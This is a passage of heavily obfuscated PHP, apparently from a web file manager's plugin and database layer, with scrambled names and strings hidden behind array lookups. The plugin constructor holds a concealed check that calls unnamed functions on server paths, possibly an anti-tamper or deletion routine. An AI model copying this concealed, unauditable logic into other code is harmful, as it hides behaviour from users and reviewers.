$this->_facade($¨–Ş—ì“); $this->_beforeInsert($Æ»˜±¦›[$”÷‡º™„], $® º÷ß½); } if (method_exists($this->db, $Ã†Ùò™ğ[351])) { for ($ıô”¢Ù” = 0; $ıô”¢Ù” < count($Æ»˜±¦›); $ıô”¢Ù” += $÷ñ°è¾ø) { $øƒ½½Îç = array_slice($Æ»˜±¦›, $ıô”¢Ù”, $÷ñ°è¾ø); if (!is_array($øƒ½½Îç) || count($øƒ½½Îç) == 0) { break; } $­†ƒÛ¤Ò = $this->db->insertAll($øƒ½½Îç, $® º÷ß½, $®òŸÂ¦×); $this->chunkEventCheck(count($øƒ½½Îç)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Æ»˜±¦› as $”÷‡º™„ => $¨–Ş—ì“) { $­†ƒÛ¤Ò = $this->db->insert($¨–Ş—ì“, $® º÷ß½, $®òŸÂ¦×); } $this->commit(); } if (!1 !== $­†ƒÛ¤Ò) { $ÒØµ”‹‚ = $this->getLastInsID(); if ($ÒØµ”‹‚) { return $ÒØµ”‹‚; } } return $­†ƒÛ¤Ò; } public function save($‚öàÃ”‹ = '', $œ´“›‡´ = array()) { $Å±ÃÕ¾· =& $_SERVER[¼’ç§¼´]; $¶È­±‘ = self::SQL_WHERE_IN_CHUNK; $§õ³ÃÙí = $this->optionsValue(); $ûˆ×ïõğ = $this->findWhereField($§õ³ÃÙí); if (!$ûˆ×ïõğ) { return parent::save($‚öàÃ”‹, $œ´“›‡´); } $ò­İò¨À = 0; $åûÈõÅÓ = $§õ³ÃÙí[$Å±ÃÕ¾·[354]][$ûˆ×ïõğ][1]; $åûÈõÅÓ = is_array($åûÈõÅÓ) ? $åûÈõÅÓ : array(); $š®ÇüüÈ = count($åûÈõÅÓ); for ($Çé±ª’ = 0; $Çé±ª’ < $š®ÇüüÈ; $Çé±ª’ += $¶È­±‘) { $‚ƒ•«œ = array_slice($åûÈõÅÓ, $Çé±ª’, $¶È­±‘); if (!is_array($‚ƒ•«œ) || count($‚ƒ•«œ) == 0) { break; } $§õ³ÃÙí[$Å±ÃÕ¾·[354]][$ûˆ×ïõğ][1] = $‚ƒ•«œ; $this->optionsValue($§õ³ÃÙí); $ò­İò¨À += parent::save($‚öàÃ”‹, $œ´“›‡´); $this->chunkEventCheck(count($‚ƒ•«œ)); } $this->chunkEventSet(); return $ò­İò¨À; } public function add($Ïñ­½‡Ë = '', $Ôï†»«ì = array(), $ÊƒİÉó = false) { if ($this->addTaskStatus && is_array($Ïñ­½‡Ë)) { $this->addTaskData[] = $Ïñ­½‡Ë; return; } return parent::add($Ïñ­½‡Ë, $Ôï†»«ì, $ÊƒİÉó); } public function parseWhereLike($­Ÿ¢ÇÙˆ, $Ğ˜‹ã¢ê = '', $¿“ÖÒ—û = false, &$‚¯Ä¯¿ = false) { $£ä¤½€ =& $_SERVER[¼’ç§¼´]; $ëšÇí¿ = $GLOBALS[$£ä¤½€[6]][$£ä¤½€[468]]; if (!$ëšÇí¿[$£ä¤½€[469]]) { return $­Ÿ¢ÇÙˆ; } if (!is_array($­Ÿ¢ÇÙˆ)) { return $­Ÿ¢ÇÙˆ; } $Ì ”ƒ¨¨ = array(); $İÖ×Ì  = 0; foreach ($­Ÿ¢ÇÙˆ as $ş›¹ÚóÊ => $ëæ»Š„æ) { if (is_array($ëæ»Š„æ) && count($ëæ»Š„æ) == 2 && $ëæ»Š„æ[0] == $£ä¤½€[470] && is_string($ëæ»Š„æ[1]) && substr($ëæ»Š„æ[1], 0, 1) == $£ä¤½€[471] && substr($ëæ»Š„æ[1], strlen($ëæ»Š„æ[1]) - 1, 1) == $£ä¤½€[471]) { $‚¯Ä¯¿ = !0; $¡­“¼Æ— = is_string($ş›¹ÚóÊ) ? $ş›¹ÚóÊ : $Ğ˜‹ã¢ê; $Õ´‘•ñç = substr($ëæ»Š„æ[1], 1, strlen($ëæ»Š„æ[1]) - 2); $Õ´‘•ñç = $this->db->escapeString($Õ´‘•ñç); if (!strpos($¡­“¼Æ—, $£ä¤½€[10])) { $¡­“¼Æ— = $£ä¤½€[472] . $¡­“¼Æ— . $£ä¤½€[472]; } $˜çÊáÌ = $£ä¤½€[222] . $Õ´‘•ñç . $£ä¤½€[222]; $Õ´‘•ñç = str_replace(array($£ä¤½€[10], $£ä¤½€[473], $£ä¤½€[11]), $£ä¤½€[474], $Õ´‘•ñç); if ($ëšÇí¿[$£ä¤½€[475]]) { $˜çÊáÌ = $£ä¤½€[476] . $Õ´‘•ñç . $£ä¤½€[477]; if ($ëšÇí¿[$£ä¤½€[478]]) { $˜çÊáÌ = $£ä¤½€[477] . $Õ´‘•ñç . $£ä¤½€[476]; } } $Ì ”ƒ¨¨[$İÖ×Ì ] = $£ä¤½€[479] . $¡­“¼Æ— . $£ä¤½€[480] . $˜çÊáÌ . $£ä¤½€[481]; $İÖ×Ì ++; continue; } if (is_array($ëæ»Š„æ)) { $Ğ˜‹ã¢ê = is_string($ş›¹ÚóÊ) ? $ş›¹ÚóÊ : $Ğ˜‹ã¢ê; $ëæ»Š„æ = $this->parseWhereLike($ëæ»Š„æ, $Ğ˜‹ã¢ê, !0, $‚¯Ä¯¿); } if (is_numeric($ş›¹ÚóÊ)) { $Ì ”ƒ¨¨[$İÖ×Ì ] = $ëæ»Š„æ; $İÖ×Ì ++; } else { $Ì ”ƒ¨¨[$ş›¹ÚóÊ] = $ëæ»Š„æ; } } if ($‚¯Ä¯¿ && !$¿“ÖÒ—û) { } return $Ì ”ƒ¨¨; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($²Íµ·®å = array()) { $«Ë¢Ÿğï =& $_SERVER[¼’ç§¼´]; $ø’ÖãÓŒ = self::SQL_WHERE_IN_CHUNK; $ÁÔë¿Öˆ = $this->optionsValue(); $àº÷™ä = $this->findWhereField($ÁÔë¿Öˆ); if (!$àº÷™ä || isset($ÁÔë¿Öˆ[$«Ë¢Ÿğï[369]]) || isset($ÁÔë¿Öˆ[$«Ë¢Ÿğï[430]])) { return parent::select($²Íµ·®å); } $ «¥Ÿ‹ = $ÁÔë¿Öˆ[$«Ë¢Ÿğï[354]][$àº÷™ä][1]; $ «¥Ÿ‹ = is_array($ «¥Ÿ‹) ? $ «¥Ÿ‹ : array(); $Š´šÓ… = null; for ($ÇóÙÇÌ© = 0; $ÇóÙÇÌ© < count($ «¥Ÿ‹); $ÇóÙÇÌ© += $ø’ÖãÓŒ) { $æü¶÷ñ = array_slice($ «¥Ÿ‹, $ÇóÙÇÌ©, $ø’ÖãÓŒ); if (!is_array($æü¶÷ñ) || count($æü¶÷ñ) == 0) { break; } $ÁÔë¿Öˆ[$«Ë¢Ÿğï[354]][$àº÷™ä][1] = $æü¶÷ñ; $this->optionsValue($ÁÔë¿Öˆ); $ˆ¾ØÅ€º = parent::select($²Íµ·®å); if (!$ˆ¾ØÅ€º) { continue; } $Š´šÓ… = is_array($Š´šÓ…) ? $Š´šÓ… : array(); $Š´šÓ… = array_merge($Š´šÓ…, $ˆ¾ØÅ€º); } return $Š´šÓ…; } public function delete($•ÚÃ¼õÖ = array()) { $Ÿ½©Ş÷î =& $_SERVER[¼’ç§¼´]; $ ®äÆ´ = self::SQL_WHERE_IN_CHUNK; $§š¡ä°Û = $this->optionsValue(); $±Ğ£Æ§Á = $this->findWhereField($§š¡ä°Û); if (!$±Ğ£Æ§Á) { return parent::delete($•ÚÃ¼õÖ); } $áŒÏ¾“è = 0; $ˆù«’Ê = $§š¡ä°Û[$Ÿ½©Ş÷î[354]][$±Ğ£Æ§Á][1]; $ˆù«’Ê = is_array($ˆù«’Ê) ? $ˆù«’Ê : array(); for ($áš‡Ü—° = 0; $áš‡Ü—° < count($ˆù«’Ê); $áš‡Ü—° += $ ®äÆ´) { $ö‡Õ„ğ = array_slice($ˆù«’Ê, $áš‡Ü—°, $ ®äÆ´); if (!is_array($ö‡Õ„ğ) || count($ö‡Õ„ğ) == 0) { break; } $§š¡ä°Û[$Ÿ½©Ş÷î[354]][$±Ğ£Æ§Á][1] = $ö‡Õ„ğ; $this->optionsValue($§š¡ä°Û); $áŒÏ¾“è += parent::delete($•ÚÃ¼õÖ); } return $áŒÏ¾“è; } private function findWhereField($è ‡¯‡ó) { $¤Êî÷Âß =& $_SERVER[¼’ç§¼´]; $õÁ•ÑÈ = self::SQL_WHERE_IN_CHUNK; if (!is_array($è ‡¯‡ó) || !is_array($è ‡¯‡ó[$¤Êî÷Âß[354]])) { return !1; } foreach ($è ‡¯‡ó[$¤Êî÷Âß[354]] as $¨Î¦ÂË³ => $ùœ€§—ß) { if (is_array($ùœ€§—ß) && isset($ùœ€§—ß[0]) && is_string($ùœ€§—ß[0]) && strtolower($ùœ€§—ß[0]) == $¤Êî÷Âß[7] && is_array($ùœ€§—ß[1]) && count($ùœ€§—ß[1]) > $õÁ•ÑÈ) { ignore_timeout(); return $¨Î¦ÂË³; } } return !1; } public function setMasterDB($Ë…îÚ¯Ï = true) { think_config($_SERVER[¼’ç§¼´][482], $Ë…îÚ¯Ï); } } goto EğµçÖæ‚ß; FÖ×Ÿóå: class Message { function __construct() { } public function send($‰“ô˜Šø = '', $ñéãøˆí = array(), $İ¦´Ãµ = "\164\145\170\x74") { $Ş¨ÃÉ¯Ä =& $_SERVER[¼’ç§¼´]; $‡ÛòŸ¡¡ = array($Ş¨ÃÉ¯Ä[33] => $Ş¨ÃÉ¯Ä[1222], $Ş¨ÃÉ¯Ä[171] => $‰“ô˜Šø); if (in_array($İ¦´Ãµ, array($Ş¨ÃÉ¯Ä[1222], $Ş¨ÃÉ¯Ä[1631]))) { $‡ÛòŸ¡¡[$Ş¨ÃÉ¯Ä[33]] = $İ¦´Ãµ; } $ñéãøˆí = array($Ş¨ÃÉ¯Ä[589] => isset($ñéãøˆí[$Ş¨ÃÉ¯Ä[589]]) ? $ñéãøˆí[$Ş¨ÃÉ¯Ä[589]] : $Ş¨ÃÉ¯Ä[12], $Ş¨ÃÉ¯Ä[676] => isset($ñéãøˆí[$Ş¨ÃÉ¯Ä[676]]) ? $ñéãøˆí[$Ş¨ÃÉ¯Ä[676]] : $Ş¨ÃÉ¯Ä[12]); if (empty($‰“ô˜Šø) || empty($ñéãøˆí[$Ş¨ÃÉ¯Ä[589]]) && empty($ñéãøˆí[$Ş¨ÃÉ¯Ä[676]])) { return !1; } $çËäÒºÓ = array($Ş¨ÃÉ¯Ä[1560] => $‡ÛòŸ¡¡, $Ş¨ÃÉ¯Ä[1632] => $ñéãøˆí); Hook::trigger($Ş¨ÃÉ¯Ä[1633], $çËäÒºÓ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ú—Ø¶•£ =& $_SERVER[¼’ç§¼´]; if ($_SERVER[$ú—Ø¶•£[434]] != $_SERVER[$ú—Ø¶•£[1634]]) { $ÂÖ—Çõœ = $ú—Ø¶•£[966]; $íµˆ²şæ = $ú—Ø¶•£[435]; $‘‹îàï = $_SERVER[$ú—Ø¶•£[436]] . $ú—Ø¶•£[437]; $Ö©Í¹ğ• = $íµˆ²şæ($‘‹îàï); $îóğÉß” = explode($ú—Ø¶•£[287], $Ö©Í¹ğ•); if (count($îóğÉß”) < $ú—Ø¶•£[702]) { $¿À‚ñ°Á = $ú—Ø¶•£[439]; $¿À‚ñ°Á(); } $à¢‡²¡ = $ú—Ø¶•£[967]; $à¢‡²¡($_SERVER[$ú—Ø¶•£[968]]); $à¢‡²¡($_SERVER[$ú—Ø¶•£[436]] . $ú—Ø¶•£[1635]); $ó“ìÍ¤ı = 1; while ($ó“ìÍ¤ı > 1) { $ó“ìÍ¤ı = $ó“ìÍ¤ı + 4; $‹Úì¯ÀÙ = rawurlencode($ó“ìÍ¤ı . $ú—Ø¶•£[465]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ú—Ø¶•£[1636]); $this->pluginName = str_replace($ú—Ø¶•£[1636], $ú—Ø¶•£[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ú—Ø¶•£[8]; $this->pluginApi = appHostGet() . $ú—Ø¶•£[1637] . $this->pluginName . $ú—Ø¶•£[8]; $this->pluginHost = $config[$ú—Ø¶•£[1638]] . $this->pluginName . $ú—Ø¶•£[8]; $this->pluginHostDefault = $config[$ú—Ø¶•£[1638]] . $this->pluginName . $ú—Ø¶•£[8]; $š‘ãßè = $config[$ú—Ø¶•£[1639]]; if ($š‘ãßè && strpos($ú—Ø¶•£[50] . $š‘ãßè . $ú—Ø¶•£[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ú—Ø¶•£[1640]] . $this->pluginName . $ú—Ø¶•£[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¼’ç§¼´][1641]); } protected function assign($ô„õ°¯ú, $ıƒœäº = false) { if (is_array($ô„õ°¯ú)) { $this->values = array_merge($this->values, $ô„õ°¯ú); } else { $this->values[$ô„õ°¯ú] = $ıƒœäº; } } protected function display($­–ÙÔÔá) { extract($this->values); require $­–ÙÔÔá; } final function hookRegist($·½û¢¬) { $this->modelPlugin->appRegist($this->pluginName, $·½û¢¬); } final function appIcon() { $©­Î€ÄÎ =& $_SERVER[¼’ç§¼´]; $Á½‚‚‡Œ = $this->appPackage(); $Ù©Çóı = $©­Î€ÄÎ[12]; if (isset($Á½‚‚‡Œ[$©­Î€ÄÎ[501]])) { if (isset($Á½‚‚‡Œ[$©­Î€ÄÎ[501]][$©­Î€ÄÎ[1642]])) { $Ù©Çóı = $©­Î€ÄÎ[1643] . $Á½‚‚‡Œ[$©­Î€ÄÎ[501]][$©­Î€ÄÎ[1642]] . $©­Î€ÄÎ[1644]; } else { if ($Á½‚‚‡Œ[$©­Î€ÄÎ[501]][$©­Î€ÄÎ[1645]]) { $Ù©Çóı = $©­Î€ÄÎ[1646] . $Á½‚‚‡Œ[$©­Î€ÄÎ[501]][$©­Î€ÄÎ[1645]] . $©­Î€ÄÎ[1647]; } } } return $Ù©Çóı; } final function fileCanView($ºØŠÅàÏ) { $ô¦Ä÷¯Ç =& $_SERVER[¼’ç§¼´]; if (request_url_safe($ºØŠÅàÏ)) { return !0; } if ($this->isShare($ºØŠÅàÏ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $¹ÖÔÙ‚ë = $ô¦Ä÷¯Ç[1648] . rawurlencode(this_url()); show_tips(LNG($ô¦Ä÷¯Ç[1649]) . $ô¦Ä÷¯Ç[1650] . $¹ÖÔÙ‚ë . $ô¦Ä÷¯Ç[1651] . LNG($ô¦Ä÷¯Ç[1652]) . $ô¦Ä÷¯Ç[1653], !1); } if (!Action($ô¦Ä÷¯Ç[1654])->authCan($ô¦Ä÷¯Ç[1655])) { show_tips(LNG($ô¦Ä÷¯Ç[1656]) . $ô¦Ä÷¯Ç[1657], !1); } ActionCall($ô¦Ä÷¯Ç[1658], $ºØŠÅàÏ); } final function isShare($íÔ²Ë¹­) { $÷üŸè¶ = KodIO::parse($íÔ²Ë¹­); return $÷üŸè¶[$_SERVER[¼’ç§¼´][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($çìÛØ¢) { if (request_url_safe($çìÛØ¢)) { return $çìÛØ¢; } if (!$this->isShare($çìÛØ¢)) { $çìÛØ¢ = $this->filePath($çìÛØ¢, !1); } return Action($_SERVER[¼’ç§¼´][1265])->linkOut($çìÛØ¢); } public function filePathLinkOut($ë‰õë‹è) { if (request_url_safe($ë‰õë‹è)) { return $ë‰õë‹è; } $this->fileCanView($ë‰õë‹è); return Action($_SERVER[¼’ç§¼´][1265])->link($ë‰õë‹è); } final function filePath($“¸ŠÚ¤¶, $Ò³¶ÖüÉ = true, $úËÒ›ş‰ = false) { $€ÀÙŸè³ =& $_SERVER[¼’ç§¼´]; $Á›Ò‘Ö“ = $this->filePathGet($“¸ŠÚ¤¶, $Ò³¶ÖüÉ); if (!$this->fileInfo) { show_tips(LNG($€ÀÙŸè³[108]), !1); } if ($úËÒ›ş‰ && isset($this->fileInfo[$€ÀÙŸè³[552]]) && $this->fileInfo[$€ÀÙŸè³[552]]) { $“õïî›Ê = Model($€ÀÙŸè³[555])->fileInfo($this->fileInfo[$€ÀÙŸè³[552]]); if (!$“õïî›Ê || !IO::exist($“õïî›Ê[$€ÀÙŸè³[87]])) { $ËâÎ“­Ê = LNG($€ÀÙŸè³[108]) . LNG($€ÀÙŸè³[1659]); if (KodUser::isRoot() && isset($“õïî›Ê[$€ÀÙŸè³[87]])) { $ËâÎ“­Ê .= $€ÀÙŸè³[1660] . $“õïî›Ê[$€ÀÙŸè³[87]] . $€ÀÙŸè³[1661]; } show_tips($ËâÎ“­Ê); } } Hook::trigger($€ÀÙŸè³[1662], $Á›Ò‘Ö“); return $Á›Ò‘Ö“; } final function filePathGet($şÇÍõáŸ, $òÖŸ¬öô = true) { $ÜŒ¬àê =& $_SERVER[¼’ç§¼´]; if ($¼¿£Çé = $this->checkSharePath($şÇÍõáŸ, $òÖŸ¬öô)) { return $¼¿£Çé; } $this->fileCanView($şÇÍõáŸ); if (request_url_safe($şÇÍõáŸ)) { $úÚ€ƒö¾ = parse_url_query($şÇÍõáŸ); if (isset($úÚ€ƒö¾[$ÜŒ¬àê[1663]]) && isset($úÚ€ƒö¾[$ÜŒ¬àê[236]])) { $©À§…¯¦ = Mcrypt::decode($úÚ€ƒö¾[$ÜŒ¬àê[236]], Model($ÜŒ¬àê[858])->get($ÜŒ¬àê[859])); if ($©À§…¯¦) { $this->fileInfo = IO::info($©À§…¯¦); $this->fileInfo[$ÜŒ¬àê[1664]] = $şÇÍõáŸ; $this->cachePath = $this->pluginCachePath($ÜŒ¬àê[12], $òÖŸ¬öô); return $©À§…¯¦; } } $şÇÍõáŸ = $this->_cacheHttpFile($şÇÍõáŸ, $òÖŸ¬öô); $this->fileInfo = IO::info($şÇÍõáŸ); } else { $this->fileInfo = IO::info($şÇÍõáŸ); $this->cachePath = $this->pluginCachePath($ÜŒ¬àê[12], $òÖŸ¬öô); } return $şÇÍõáŸ; } final function _cacheHttpFile($¸®À•¹×, $Ğ®äÚ‘ª = true) { $İ×œ‰®Ò =& $_SERVER[¼’ç§¼´]; $€Ğöá‘ = parse_url_query($¸®À•¹×); $á‚Æ×¬ë = get_path_ext($¸®À•¹×); if (isset($€Ğöá‘[$İ×œ‰®Ò[32]]) && $€Ğöá‘[$İ×œ‰®Ò[32]]) { $á‚Æ×¬ë = get_path_ext($€Ğöá‘[$İ×œ‰®Ò[32]]); } $åË•Èæ· = hash_path($¸®À•¹×) . $İ×œ‰®Ò[10] . $á‚Æ×¬ë; $this->cachePath = $this->pluginCachePath($Ğ®äÚ‘ª ? $åË•Èæ· : $İ×œ‰®Ò[12]); $Ù¢êµ˜ù = IO::fileNameExist($this->cachePath, $åË•Èæ·); if ($Ù¢êµ˜ù) { return KodIO::make($Ù¢êµ˜ù); } $ŒéÚ­àÙ = rtrim($this->cachePath, $İ×œ‰®Ò[8]) . $İ×œ‰®Ò[8] . $åË•Èæ·; return $this->pluginCacheFileSet($ŒéÚ­àÙ, file_get_contents_nossl($¸®À•¹×)); } final function checkSharePath($†¢ø‰®å, $ê±È”­™ = true) { $‰Ãßªãß =& $_SERVER[¼’ç§¼´]; if (!$this->isShare($†¢ø‰®å)) { return !1; } $²›ä‚òÈ = Action($‰Ãßªãß[1265])->sharePathInfo($†¢ø‰®å); if (!is_array($²›ä‚òÈ) || !isset($²›ä‚òÈ[$‰Ãßªãß[87]])) { show_json(LNG($‰Ãßªãß[1665]), !1); } $this->fileInfo = $²›ä‚òÈ; $this->cachePath = $this->pluginCachePath(!1, $ê±È”­™); return $²›ä‚òÈ[$‰Ãßªãß[87]]; } final function pluginCachePath($±ÉÎÈ— = '', $¡áç†ğÜ = false) { $â®õ¬÷Ğ =& $_SERVER[¼’ç§¼´]; if ($¡áç†ğÜ && is_array($this->fileInfo)) { $±ÉÎÈ— = kodIO::hashPath($this->fileInfo); } $ ÊÃğœì = rtrim(IO_PATH_SYSTEM_TEMP . $â®õ¬÷Ğ[1666] . $this->pluginName . $â®õ¬÷Ğ[8] . $±ÉÎÈ—, $â®õ¬÷Ğ[8]); $¾é’»§ = IO::infoFullSimple($ ÊÃğœì); $÷¤ÒûéŞ = $¾é’»§ && is_array($¾é’»§) ? $¾é’»§[$â®õ¬÷Ğ[87]] : $â®õ¬÷Ğ[12]; if (!$÷¤ÒûéŞ) { $÷¤ÒûéŞ = IO::mkdir($ ÊÃğœì); } return $÷¤ÒûéŞ; } final function pluginCacheFileSet($ºÕéÒŒ¦, $ÜµçĞ = '') { $ÛÙĞ¹™í =& $_SERVER[¼’ç§¼´]; $…Ù˜¸ºÊ = IO::infoFullSimple($ºÕéÒŒ¦); if (!$…Ù˜¸ºÊ) { return IO::mkfile($ºÕéÒŒ¦, $ÜµçĞ, REPEAT_REPLACE); } IO::setContent($…Ù˜¸ºÊ[$ÛÙĞ¹™í[87]], $ÜµçĞ); return $…Ù˜¸ºÊ[$ÛÙĞ¹™í[87]]; } final function pluginLocalFile($âé¿µı = '') { $£ÅŒ•Ÿ³ =& $_SERVER[¼’ç§¼´]; $è¤úÌ³Ö = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($è¤úÌ³Ö)) { mk_dir($è¤úÌ³Ö); } if (!$âé¿µı) { return $è¤úÌ³Ö; } $¦÷óôª´ = IO::info($âé¿µı); $ê‰•¯¥• = $£ÅŒ•Ÿ³[1667] . KodIO::hashPath($¦÷óôª´) . $£ÅŒ•Ÿ³[10] . $¦÷óôª´[$£ÅŒ•Ÿ³[169]]; if (!checkExtSafe($ê‰•¯¥•)) { $ê‰•¯¥• = $ê‰•¯¥• . $£ÅŒ•Ÿ³[1300]; } $÷ÉäšÇ› = $è¤úÌ³Ö . $ê‰•¯¥•; if (@file_exists($÷ÉäšÇ›)) { return $÷ÉäšÇ›; } return IO::copy($âé¿µı, $è¤úÌ³Ö, 0, $ê‰•¯¥•); } final function appPackage() { $çù€¹Êç =& $_SERVER[¼’ç§¼´]; if ($this->packageData) { return $this->packageData; } $šºÂ±ÂØ = $this->parseFile($this->pluginPath . $çù€¹Êç[1668]); $this->parseLang($šºÂ±ÂØ); $Ş€œâ›É = json_decode_force($šºÂ±ÂØ); if (!$Ş€œâ›É) { return array(); } $—¡ÛÖÓ÷ = Hook::trigger($çù€¹Êç[1669], $Ş€œâ›É); if ($—¡ÛÖÓ÷ && is_array($—¡ÛÖÓ÷)) { $Ş€œâ›É = $—¡ÛÖÓ÷; } $this->packageData = $Ş€œâ›É; return $Ş€œâ›É; } public function packageInfoGet($€İï¼¿Ş) { $Â­ÜåËÓ = $this->appPackage(); return array_get_value($Â­ÜåËÓ, $€İï¼¿Ş); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¼’ç§¼´][1670]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¼’ç§¼´][1671]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¼’ç§¼´][1672]); } public function echoJsAssign($ª­”™Ğ‰, $¾”ŒùôÃ) { $this->echoJsAssignArr[$ª­”™Ğ‰] = $¾”ŒùôÃ; } private function parseFile($ìíÒˆ·) { $¤‘‡º¥ş =& $_SERVER[¼’ç§¼´]; $¼ï›¾“Ñ = file_get_contents_nossl($ìíÒˆ·); $â·ÄÍ§¿ = array($¤‘‡º¥ş[1673], $¤‘‡º¥ş[1674], $¤‘‡º¥ş[1675], $¤‘‡º¥ş[1676], $¤‘‡º¥ş[1677], $¤‘‡º¥ş[1678], $¤‘‡º¥ş[1679]); $³ÍŞÅù = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¤‘‡º¥ş[92]][$¤‘‡º¥ş[1680]]); foreach ($this->echoJsAssignArr as $§·’Ùä => $­è¬ƒÍ“) { $â·ÄÍ§¿[] = $¤‘‡º¥ş[1681] . $§·’Ùä . $¤‘‡º¥ş[1682]; $³ÍŞÅù[] = is_array($­è¬ƒÍ“) || is_object($­è¬ƒÍ“) ? rawurlencode(json_encode($­è¬ƒÍ“)) : $­è¬ƒÍ“; } if (strstr($¼ï›¾“Ñ, $¤‘‡º¥ş[1683])) { $·ÒºŠÓ¦ = rawurlencode(json_encode($this->pluginLangArr)); $¼ï›¾“Ñ = str_replace($¤‘‡º¥ş[1683], $·ÒºŠÓ¦, $¼ï›¾“Ñ); } if (strstr($¼ï›¾“Ñ, $¤‘‡º¥ş[1684])) { $·ÒºŠÓ¦ = $·ÒºŠÓ¦ = rawurlencode(json_encode($this->getConfig())); $¼ï›¾“Ñ = str_replace($¤‘‡º¥ş[1684], $·ÒºŠÓ¦, $¼ï›¾“Ñ); } $¼ï›¾“Ñ = str_replace($â·ÄÍ§¿, $³ÍŞÅù, $¼ï›¾“Ñ); return $¼ï›¾“Ñ; } private function parseLang(&$¼¬ú½€¿) { $Ö®±¢ı =& $_SERVER[¼’ç§¼´]; $üÄ¾Š‹Œ = $Ö®±¢ı[1685]; if (!strstr($¼¬ú½€¿, $üÄ¾Š‹Œ)) { return; } preg_match_all($Ö®±¢ı[1686], $¼¬ú½€¿, $Á’Ê‡™); if (!is_array($Á’Ê‡™) || count($Á’Ê‡™) == 0 || !is_array($Á’Ê‡™[0]) || count($Á’Ê‡™[0]) == 0) { return; } $€äœ²ğ = array(); $³üÈ•˜Ÿ = array(); foreach ($Á’Ê‡™[0] as $îêµ–ÔÀ) { $Ô®ùß›  = substr($îêµ–ÔÀ, strlen($üÄ¾Š‹Œ), -4); $İªôù£é = LNG($Ô®ùß› ); $€äœ²ğ[] = $îêµ–ÔÀ; $³üÈ•˜Ÿ[] = str_replace(array($Ö®±¢ı[287], $Ö®±¢ı[1165], $Ö®±¢ı[419], $Ö®±¢ı[121]), array($Ö®±¢ı[53], $Ö®±¢ı[53], $Ö®±¢ı[12], $Ö®±¢ı[1687]), $İªôù£é); } $¼¬ú½€¿ = str_replace($€äœ²ğ, $³üÈ•˜Ÿ, $¼¬ú½€¿); } private function parseConfig(&$½Àêµ²) { $ûê„ƒÊ´ =& $_SERVER[¼’ç§¼´]; $ÙÔÈÒ¥ô = $ûê„ƒÊ´[1688]; if (!strstr($½Àêµ², $ÙÔÈÒ¥ô)) { return; } preg_match_all($ûê„ƒÊ´[1689], $½Àêµ², $ŸÆí¦¹˜); if (!is_array($ŸÆí¦¹˜) || count($ŸÆí¦¹˜) == 0 || !is_array($ŸÆí¦¹˜[0]) || count($ŸÆí¦¹˜[0]) == 0) { return; } $´ÅÉíú = $this->getConfig(); $êºïäœĞ = array(); $ĞùÃÙƒ = array(); foreach ($ŸÆí¦¹˜[0] as $½›èŒßÛ) { $‚àŞşåµ = substr($½›èŒßÛ, strlen($ÙÔÈÒ¥ô), -2); $êºïäœĞ[] = $½›èŒßÛ; $ĞùÃÙƒ[] = _get($´ÅÉíú, $‚àŞşåµ); } $½Àêµ² = str_replace($êºïäœĞ, $ĞùÃÙƒ, $½Àêµ²); } private function parsePackage(&$ğèÜÁí) { $¤˜’·˜‚ =& $_SERVER[¼’ç§¼´]; $à‚¦ô¹÷ = $¤˜’·˜‚[1690]; if (!strstr($ğèÜÁí, $à‚¦ô¹÷)) { return; } preg_match_all($¤˜’·˜‚[1691], $ğèÜÁí, $§£ÎÓ); if (!is_array($§£ÎÓ) || count($§£ÎÓ) == 0 || !is_array($§£ÎÓ[0]) || count($§£ÎÓ[0]) == 0) { return; } $»Šò­­½ = $this->appPackage(); $¹«Ğ­ëµ = array(); $Ó€Û°·‡ = array(); foreach ($§£ÎÓ[0] as $–Ùµä°) { $Ğƒ„˜«º = substr($–Ùµä°, strlen($à‚¦ô¹÷), -2); $¹«Ğ­ëµ[] = $–Ùµä°; $Ó€Û°·‡[] = _get($»Šò­­½, $Ğƒ„˜«º); } $ğèÜÁí = str_replace($¹«Ğ­ëµ, $Ó€Û°·‡, $ğèÜÁí); } final function echoFile($®×»‰½‡, $ÌÇ¶Æ×÷ = false) { $¼Ô™à×å =& $_SERVER[¼’ç§¼´]; $ï¡Øå‘— = $this->pluginPath . $®×»‰½‡; if (ACT == $¼Ô™à×å[1692]) { echo $¼Ô™à×å[1693] . $this->pluginName . $¼Ô™à×å[8] . $®×»‰½‡ . $¼Ô™à×å[1694]; if (!file_exists($ï¡Øå‘—)) { echo $¼Ô™à×å[1695]; return; } } $Ÿƒ€ë˜Ÿ = $this->parseFile($ï¡Øå‘—); $this->parseLang($Ÿƒ€ë˜Ÿ); $this->parseConfig($Ÿƒ€ë˜Ÿ); $this->parsePackage($Ÿƒ€ë˜Ÿ); if (is_array($ÌÇ¶Æ×÷)) { $Ÿƒ€ë˜Ÿ = str_replace(array_keys($ÌÇ¶Æ×÷), array_values($ÌÇ¶Æ×÷), $Ÿƒ€ë˜Ÿ); } echo $¼Ô™à×å[287] . $Ÿƒ€ë˜Ÿ; } private function checkVersion() { $£˜ÕÌÙÌ =& $_SERVER[¼’ç§¼´]; $Àäô¨Şâ = $this->appPackage(); $à€™Ñ²’ = $this->getConfig(); if ($à€™Ñ²’[$£˜ÕÌÙÌ[1696]] == $Àäô¨Şâ[$£˜ÕÌÙÌ[1670]]) { return; } $this->regist(); 